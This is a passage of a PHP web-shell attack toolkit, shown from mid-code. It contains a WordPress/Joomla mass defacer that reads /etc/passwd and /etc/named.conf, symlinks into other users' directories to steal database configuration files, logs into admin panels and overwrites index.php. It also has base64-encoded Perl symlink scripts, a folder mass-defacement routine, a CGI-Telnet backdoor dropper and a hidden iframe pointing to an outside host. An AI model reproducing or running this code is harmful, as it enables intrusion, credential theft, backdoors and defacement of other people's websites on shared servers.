1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);if($hidden2) {$output.= "[+] index.php file found in Theme Editor<br />";} else {$output.= "[-] index.php Not found in Theme Editor<br />";}}if($hidden2) {$url2=$site_url."/index.php?option=com_templates&layout=edit";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$content."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<dd class="message message">');$cond = 0;if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template successfully saved<br />";$cond = 1;}}} else {$req =mysql_query("SELECT * from  `".$prefix."templates_menu` WHERE client_id='0'");$data = mysql_fetch_array($req);$template_name=$data["template"];$useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";$url2=$site_url."/index.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);if($hidden) {curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456&option=com_login&task=login&".$hidden."=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$pos = strpos($buffer,"com_config");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";}}if($pos) {$url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);if($hidden2) {$output.= "[+] index.php file founded in Theme Editor<br />";} else {$output.= "[-] index.php Not found in Theme Editor<br />";}}if($hidden2) {$url2=$site_url."/index.php?option=com_templates&layout=edit";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$content."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co);$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<dd class="message message fade">');$cond = 0;if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template successfully saved<br />";$cond = 1;}}}} else {$output.= "[-] DB Error<br />";}global $base_path;unlink($base_path.$co);return array('cond'=>$cond, 'output'=>$output); }function exec_mode_1($def_url) {@mkdir('sym',0777);$wr  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";$fp = @fopen ('sym/.htaccess','w');fwrite($fp, $wr);@symlink('/','sym/root');$dominios = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);$out[1] = array_unique($out[1]);$numero_dominios = count($out[1]);echo "Total domains: $numero_dominios <br><br />";$def = file_get_contents($def_url);$def = urlencode($def);$dd = 'PD9waHANCiRkZWYgPSBmaWxlX2dldF9jb250ZW50cygnaHR0cDovL3pvbmVobWlycm9ycy5vcmcvZGVmYWNlZC8yMDEzLzAzLzE5L2Fzc29jaWFwcmVzcy5uZXQnKTsNCiRwID0gZXhwbG9kZSgncHVibGljX2h0bWwnLGRpcm5hbWUoX19GSUxFX18pKTsNCiRwID0gJHBbMF0uJ3B1YmxpY19odG1sJzsNCmlmICgkaGFuZGxlID0gb3BlbmRpcigkcCkpIHsNCiAgICAkZnAxID0gQGZvcGVuKCRwLicvaW5kZXguaHRtbCcsJ3crJyk7DQogICAgQGZ3cml0ZSgkZnAxLCAkZGVmKTsNCiAgICAkZnAxID0gQGZvcGVuKCRwLicvaW5kZXgucGhwJywndysnKTsNCiAgICBAZndyaXRlKCRmcDEsICRkZWYpOw0KICAgICRmcDEgPSBAZm9wZW4oJHAuJy9pbmRleC5odG0nLCd3KycpOw0KICAgIEBmd3JpdGUoJGZwMSwgJGRlZik7DQogICAgZWNobyAnRG9uZSc7DQp9DQpjbG9zZWRpcigkaGFuZGxlKTsNCnVubGluayhfX0ZJTEVfXyk7DQo/Pg==';$base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/sym/root/home/';$output = fopen('defaced.html', 'a+');$_SESSION['count1'] = (isset($_GET['st']) && $_GET['st']!='') ? (isset($_SESSION['count1']) ? $_SESSION['count1'] :0 ) : 0;$_SESSION['count2'] = (isset($_GET['st']) && $_GET['st']!='') ? (isset($_SESSION['count2']) ? $_SESSION['count2'] :0 ) : 0;echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$st = (isset($_GET['st']) && $_GET['st']!='') ? $_GET['st'] : 0;for($i = $st; $i <= $numero_dominios; $i++){$domain = $out[1][$i];$dono_arquivo = @fileowner("/etc/valiases/".$domain);$infos = @posix_getpwuid($dono_arquivo);if($infos['name']!='root') {$config01 = @file_get_contents($base_url.$infos['name']."/public_html/configuration.php");$config02 = @file_get_contents($base_url.$infos['name']."/public_html/wp-config.php");$config03 = @file_get_contents($base_url.$infos['name']."/public_html/blog/wp-config.php");$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count1'] = $_SESSION['count1'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config02, $dd);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count2'] = $_SESSION['count2'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config03 && preg_match('/DB_NAME/i',$config03)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config03, $dd);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count2'] = $_SESSION['count2'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($_SESSION['count1']+$_SESSION['count2']).' (JOOMLA = '.$_SESSION['count1'].', WORDPRESS = '.$_SESSION['count2'].')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($_SESSION['count1']+$_SESSION['count2'] > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}function exec_mode_2($def_url) {$domains = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $domains, $out);$out = array_unique($out[1]);$num = count($out);print("Total domains: $num<br><br />");$def = file_get_contents($def_url);$def = urlencode($def);$output = fopen('defaced.html', 'a+');$defaced = '';$count1 = 0;$count2 = 0;echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$map = array();foreach($out as $d) {$info = @posix_getpwuid(fileowner("/etc/valiases/".$d));$map[$info['name']] = $d;}$dt = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiAgICAkbXNyID0gcXh7cHdkfTs
   NCiAgICAka29sYT0kbXNyLiIvIi4kdXNlcjsNCiAgICAka29sYT1+cy9cbi8vZzsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2
   h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicjI2pvb21sYS50eHQnKTsgDQogICAgc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19od
   G1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLicjI3dvcmRwcmVzcy50eHQnKTsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwv
   YmxvZy93cC1jb25maWcucGhwJywka29sYS4nIyNzd29yZHByZXNzLnR4dCcpOw0KfQ0KDQpsb2NhbCAkLzsNCm9wZW4oRklMRSwgJy9ldGMvcGFzc3d
   kJyk7ICANCkBsaW5lcyA9IDxGSUxFPjsgDQpjbG9zZShGSUxFKTsNCiR5ID0gQGxpbmVzOw0KDQpmb3IoJGthPTA7JGthPCR5OyRrYSsrKXsNCiAgIC
   B3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',0777);file_put_contents('plsym/plsym.cc', base64_decode($dt));chmod('plsym/plsym.cc', 0755);$wr  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n\nAddType application/x-httpd-cgi .cc\n\nAddHandler cgi-script .cc\nAddHandler cgi-script .cc";$fp = @fopen ('plsym/.htaccess','w');fwrite($fp, $wr);fclose($fp);$res = file_get_contents('http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/plsym.cc');  $url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/';unlink('plsym/plsym.cc');$data = file_get_contents($url);preg_match_all('/<a href="(.+)">/', $data, $match);unset($match[1][0]);$i = 1;foreach($match[1] as $m){$mz = explode('##',urldecode($m));$config01 = '';$config02 = '';if($mz[1] == 'joomla.txt') {$config01 = file_get_contents($url.$m);}if($mz[1] == 'wordpress.txt') {$config02 = file_get_contents($url.$m);}$domain = $map[$mz[0]];$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i++.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count1++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config02, $def);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count2++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($count1+$count2).' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($count1+$count2 > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}function exec_mode_3($def_url) {$domains = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $domains, $out);$out = array_unique($out[1]);$num = count($out);print("Total domains: $num<br><br />");$def = file_get_contents($def_url);$def = urlencode($def);  $output = fopen('defaced.html', 'a+');$defaced = '';$count1 = 0;$count2 = 0;echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$map = array();foreach($out as $d) {$info = @posix_getpwuid(fileowner("/etc/valiases/".$d));$map[$info['name']] = $d;}$dt = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiAgICAkbXNyID0gcXh7cHd
   kfTsNCiAgICAka29sYT0kbXNyLiIvIi4kdXNlcjsNCiAgICAka29sYT1+cy9cbi8vZzsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcH
   VibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicjI2pvb21sYS50eHQnKTsgDQogICAgc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL
   3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLicjI3dvcmRwcmVzcy50eHQnKTsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicv
   cHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywka29sYS4nIyNzd29yZHByZXNzLnR4dCcpOw0KfQ0KDQpsb2NhbCAkLzsNCm9wZW4oRkl
   MRSwgJ2RhdGEudHh0Jyk7ICANCkBsaW5lcyA9IDxGSUxFPjsgDQpjbG9zZShGSUxFKTsNCiR5ID0gQGxpbmVzOw0KDQpmb3IoJGthPTA7JGthPC
   R5OyRrYSsrKXsNCiAgICB3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',0777);file_put_contents('plsym/data.txt', $_POST['man_data']);file_put_contents('plsym/plsym.cc', base64_decode($dt));chmod('plsym/plsym.cc', 0755);$wr  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n\nAddType application/x-httpd-cgi .cc\n\nAddHandler cgi-script .cc\nAddHandler cgi-script .cc";$fp = @fopen ('plsym/.htaccess','w');fwrite($fp, $wr);fclose($fp);$res = file_get_contents('http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/plsym.cc');  $url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/';unlink('plsym/plsym.cc');$data = file_get_contents($url);preg_match_all('/<a href="(.+)">/', $data, $match);unset($match[1][0]);$i=1;foreach($match[1] as $m){$mz = explode('##',urldecode($m));$config01 = '';$config02 = '';if($mz[1] == 'joomla.txt') {$config01 = file_get_contents($url.$m);}if($mz[1] == 'wordpress.txt') {$config02 = file_get_contents($url.$m);}$domain = $map[$mz[0]];$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.($i++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count1++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config02, $def);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count2++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($count1+$count2).' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($count1+$count2 > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}echo '<!DOCTYPE html><html><head><link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css"><style type="text/css">.header {position:fixed;width:100%;top:0;background:#000;}.footer {position:fixed;width:100%;bottom:0;background:#000;}input[type="radio"]{margin-top: 0;}.td2 {border-left:1px solid red;border-radius: 2px 2px 2px 2px;}.even {background-color: rgba(25, 25, 25, 0.6);}.odd {background-color: rgba(102, 102, 102, 0.6);}textarea{background: rgba(0,0,0,0.6); color: white;}.green {color:#00FF00;font-weight:bold;}.red {color:#FF0000;font-weight:bold;}</style><script type="text/javascript">function change() {if(document.getElementById(\'rcd\').checked == true) {document.getElementById(\'tra\').style.display = \'\';} else {document.getElementById(\'tra\').style.display = \'none\';}}function hide() {document.getElementById(\'tra\').style.display = \'none\';}</script></head><body><h2 style="font-size:25px;color:#00ff00;text-align: center;font-family:orbitron;text-shadow: 6px 6px 6px black;">Wordpress and Joomla Mass Defacer</h2>';if(!isset($_POST['form_action']) && !isset($_GET['mode'])){echo '<center><div class="mybox" align="center"><form action="" method="post"><table><tr><td><input type="radio" value="1" name="mode" checked="checked" onclick="hide();"></td><td>using /etc/named.conf ('.(is_readable('/etc/named.conf')?'<span class="green">READABLE</span>':'<span class="red">NOT READABLE</span>').')</td></tr><tr><td><input type="radio" value="2" name="mode" onclick="hide();"></td><td>using /etc/passwd ('.(is_readable('/etc/passwd')?'<span class="green">READABLE</span>':'<span class="red">NOT READABLE</span>').')</td></tr><tr><td><input type="radio" value="2" name="mode" id="rcd" onclick="change();"></td><td>manual copy of /etc/passwd</td></tr><tr id="tra" style="display: none;"><td></td><td><textarea cols="60" rows="10" name="man_data"></textarea></td></tr></table><br><input type="hidden" name="form_action" value="1"><table><tr><td><b>index url: </b><input class="inputz" size="45" type="text" name="defpage" value=""></tr></td></table><input class="inputzbut" type="submit" value="Attack !" name="Submit"></form></div></center>';}$milaf_el_index = $_POST['defpage'];if($_POST['form_action'] == 1) {if($_POST['mode']==1) { exec_mode_1($milaf_el_index); }if($_POST['mode']==2) { exec_mode_2($milaf_el_index); }if($_POST['mode']==3) { exec_mode_3($milaf_el_index); }}if($_GET['mode']==1) { exec_mode_1($milaf_el_index); }echo '<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body></html>';
}
#==================[ Multi Mass Deface ]==================#
if(isset($_POST['massdeface']))
{
echo "<center/><br/><b><font color=#00ff00>-=[ Folder Mass Deface ]=-</font></b><br>";
error_reporting(0);
$deface=
'<?php

echo "<br><br>

HACKED BY X-1N73CT, PATCH YOUR SECURITY SYSTEM 

";
/////[+]otomatic mass deface all page in website[+]/////
$inject = "<ifModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ./index.php [L]
</ifModule>";
$mass = fopen (".htaccess","w");
$tulis = fwrite ($mass,$inject);
fclose($mass);

?>';
?>
<form ENCTYPE="multipart/form-data" action="<?php $_SERVER['PHP_SELF']?>" method='post'>
<td><table><table class="tabnet" >
<form method='post'>
<tr>
	<tr>
	<td>&nbsp;&nbsp;Folder</td><td><input class ='inputz' type='text' name='path' size='60' value="<?php echo getcwd();?>"></td>
	</tr><br>
	<tr>
	<td>file name</td><td><input class ='inputz' type='text' name='file' size='60' value="index.php"></td>
	</tr>
	<tr>
	</tr>
</tr>
<th colspan='2'><b>Index code</b></th><br></table>
<textarea style='background:black;outline:none;' name='index' rows='10' cols='67'>
<?php 
echo $deface;
?>
</textarea><br>
<center><input class='inputzbut' type='submit' value="&nbsp;&nbsp;Deface&nbsp;&nbsp;"></center></form></table><br></form>

<?php $mainpath=$_POST[path];$file=$_POST[file];$dir=opendir("$mainpath");$code=base64_encode($_POST[index]);$indx=base64_decode($code);while($row=readdir($dir)){$start=@fopen("$row/$file","w+");$finish=@fwrite($start,$indx);if ($finish){echo "$row/$file > Done<br><br>";}}}
}
//////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'cgi')) { @ini_set('output_buffering',0); 
?>
<br><br><center><b><font size=4>+--=[ Multi Bypass Exploit ]=--+</font></b></center>
	<form method='post'><br><center><table class='tabnet'>
	<tr><th colspan='5'><b>Multi Bypass Exploit</b></th></tr>
	<tr><th><b>Python</b></th><th><b>CGI Telnet v.1</b></th><th><b>CGI Telnet V1.3</b></th></tr>
	<tr><td><input class='inputzbut' type='submit' name='python' value="Python" /></td>
	<td><input class='inputzbut' type='submit'name='cgi1' value="CGI Telnet V.1" /></td><td>
	<input class='inputzbut' type='submit' name='cgi2012' value="CGI Telnet V1.3" /></td></tr>
	</table></center>
	</form><br><hr><br><br>
<?php
#==================[ Multi Bypass Exploit ]==================#

if(isset($_POST['cgi2012']))
{
echo "<center/><b>+--==[ CGI-Telnet Version 1.3 ]==--+</b><br><br>";
    mkdir('cgi2012', 0755);
    chdir('cgi2012');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "AddHandler cgi-script .izo";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$cgi2012 = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluCnVzZSBNSU1FOjpCYXNlNjQ7CiRWZXJzaW9uPSAiQ0dJLVRlbG5ldCBWZXJzaW9uIDEuMyI7CiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7CgokUGFzc3dvcmQgPSAiYmFuZHVuZ2tvdGFzYW1wYWgiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4Kc3ViIElzX1dpbigpewoJJG9zID0gJnRyaW0oJEVOVnsiU0VSVkVSX1NPRlRXQVJFIn0pOwoJaWYoJG9zID1+IG0vd2luL2kpewoJCXJldHVybiAxOwoJfQoJZWxzZXsKCQlyZXR1cm4gMDsKCX0KfQokV2luTlQgPSAmSXNfV2luKCk7CQkJCSMgWW91IG5lZWQgdG8gY2hhbmdlIHRoZSB2YWx1ZSBvZiB0aGlzIHRvIDEgaWYKCQkJCQkJCQkjIHlvdSdyZSBydW5uaW5nIHRoaXMgc2NyaXB0IG9uIGEgV2luZG93cyBOVAoJCQkJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkJCQkJIyBjYW4gbGVhdmUgdGhlIHZhbHVlIGFzIGl0IGlzLgoKJE5UQ21kU2VwID0gIiYiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gV2luZG93cyBOVC4KCiRVbml4Q21kU2VwID0gIjsiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gVW5peC4KCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTAwMDA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkCgkJCQkJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMKCQkJCQkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLgoJCQkJCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMKCQkJCQkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkJIyBJZiB0aGlzIGlzIDEsIHRoZW4gZGF0YSBpcyBzZW50IHRvIHRoZQoJCQkJCQkJCSMgYnJvd3NlciBhcyBzb29uIGFzIGl0IGlzIG91dHB1dCwgb3RoZXJ3aXNlCgkJCQkJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkJCQkJIyBjb21wbGV0ZXMuIFRoaXMgaXMgdXNlZnVsIGZvciBjb21tYW5kcyBsaWtlCgkJCQkJCQkJIyBwaW5nLCBzbyB0aGF0IHlvdSBjYW4gc2VlIHRoZSBvdXRwdXQgYXMgaXQKCQkJCQkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwokY29scz0gMTUwOwokcm93cz0gMjY7CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUgYnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0CiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlwYXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbn